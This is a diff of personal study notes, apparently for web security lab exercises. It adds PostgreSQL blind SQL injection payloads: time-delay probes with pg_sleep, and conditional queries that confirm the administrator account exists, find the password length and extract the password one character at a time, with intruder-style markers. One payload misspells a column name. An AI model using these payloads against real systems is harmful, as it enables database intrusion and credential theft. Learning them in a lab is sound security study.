@@ -132,8 +132,8 @@ Replacing the table and column names to retrieve the usernames and passwords for
 ' UNION SELECT null,'a'--   ERROR 200 (so only the second one is)
 ```
 
-In order to retrieve data we need to do that only on the second position using concatenation:
-![[Pasted image 20240627154432.png]]
+In order to retrieve data we need to do that only on the second position using a concatenation method:
+		![[Pasted image 20240627154432.png]]
 ```
 (...)
 
@@ -291,10 +291,43 @@ TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
 
 ## 13. Blind SQL injection with time delays
 ![[Pasted image 20240629015925.png]]
+
+Confirm that parameter is vulnerable to injection
 ```
 TrackingId=ogAZZfxtOKUELbuJ' || (SELECT pg_sleep(10)) --
 ```
 
 
 ## 14. Blind SQL injection with time delays and information retrieval
-![[Pasted image 20240629024841.png]]
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+Confirm that the parameter is vulnerable to injection
+```
+|| SELECT(pg_sleep(10))--
+```
+
+Confirm that the `users` table with `username`='administrator' exists
+```
+|| (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
+```
+
+Password length
+```
+|| (SELECT CASE WHEN (usernmae='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
+```
+
+```
+|| (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>§1§) THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
+```
+
+Password enumeration
+```
+|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
+```
+
+```
+|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
+```
+
+## 15. Blind SQL injection with out-of-band interaction
